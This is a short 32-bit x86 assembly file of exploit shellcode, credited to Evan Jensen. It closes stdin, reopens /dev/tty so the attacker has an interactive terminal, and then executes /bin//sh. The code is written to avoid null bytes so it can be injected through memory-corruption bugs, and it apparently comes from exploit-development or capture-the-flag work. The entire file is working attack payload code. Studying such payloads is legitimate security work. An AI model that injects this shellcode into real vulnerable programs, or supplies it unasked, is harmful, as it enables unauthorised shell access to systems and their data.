	;; Shellcode that will reattatch to stdin
	;; Evan Jensen (wont) 111012
BITS 32
	
%include "short32.s"
	global main

main:
_close:
	xor eax,eax
	xor ebx,ebx
	mov al,close
	int 0x80		;close stdin
tty:
	push ebx
	push 0x7974742f
	push 0x7665642f
	mov ebx,esp 		;/dev/tty
	xor ecx,ecx
	mov cl,2		;O_RDRW
	mov al,open		
	int 0x80	;open("/dev/tty",O_RDRW);
	
	;; Any local shellcode here
sh:	
	xor eax,eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx,esp
	xor edx,edx
	xor ecx,ecx
	mov al,execve
	int 0x80
